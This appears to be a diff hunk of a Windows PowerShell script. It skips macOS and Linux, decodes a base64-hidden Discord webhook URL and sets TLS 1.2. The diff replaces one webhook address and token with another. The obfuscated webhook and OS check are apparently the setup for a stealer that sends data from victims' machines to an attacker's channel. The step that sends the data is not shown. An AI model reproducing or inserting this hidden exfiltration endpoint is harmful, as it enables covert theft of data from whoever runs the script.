@@ -1,6 +1,6 @@
 if ($IsMacOS -or $IsLinux -or $env:OSTYPE -like "*darwin*" -or $env:OSTYPE -like "*linux*") { exit }
 
-$b64_tier1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MTkxNTcwMzYyMjgzMjIyOC9Ea1lackRwM1JJcVIwVVh1SkhBSURadklrX19nVk0zU29WMmU3QWZsZ0xETXRCRTV3T2ZoYmJvYnlQcHBPLU9UNjdjaQ=="
+$b64_tier1 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQ5MjU1MjgxMzQ1MDg4NzMzOC83SURPTmdpZUJUZ2dSbUU4TWJtTXJBT1dwM3cxcEdJZ1NleVFjWl90UUlSOFJaeUdMUGNxX3FCc0N4aWtzZUlPOUlSMA=="
 $w = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64_tier1))
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
